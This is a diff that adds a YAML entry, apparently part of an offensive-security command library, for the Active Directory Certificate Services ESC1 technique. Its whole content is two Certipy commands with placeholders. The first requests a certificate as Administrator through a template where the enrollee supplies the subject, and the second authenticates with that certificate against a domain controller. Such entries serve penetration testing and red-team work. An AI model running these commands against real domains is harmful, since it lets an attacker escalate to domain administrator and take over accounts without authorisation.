@@ -1,0 +1,10 @@
+name: ADCSESC1
+description: ESC1 - Request certificate as any user (enrollee supplies subject)
+commands:
+- '# Certipy'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'
+- ''
+- '# Authenticate with certificate'
+- certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+opsec: []
+references: []
